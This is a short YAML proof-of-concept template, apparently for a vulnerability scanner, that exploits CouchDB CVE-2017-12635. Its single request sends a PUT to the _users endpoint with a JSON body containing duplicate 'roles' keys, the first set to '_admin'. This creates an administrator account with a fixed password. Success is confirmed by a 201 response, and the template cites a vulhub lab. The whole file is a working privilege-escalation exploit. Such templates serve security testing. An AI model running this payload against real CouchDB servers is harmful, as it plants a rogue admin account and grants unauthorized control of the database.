name: poc-yaml-couchdb-cve-2017-12635
set:
  r1: randomLowercase(32)
rules:
  - method: PUT
    path: '/_users/org.couchdb.user:{{r1}}'
    headers:
      Content-Type: application/json
      Content-Length: '192'
    body: |-
      {
        "type": "user",
        "name": "{{r1}}",
        "roles": ["_admin"],
        "roles": [],
        "password": "fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"
      }
    follow_redirects: false
    expression: |
      response.status == 201 && response.body.bcontains(bytes("org.couchdb.user:" + r1))
detail:
  author: j4ckzh0u(https://github.com/j4ckzh0u)
  links:
    - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635
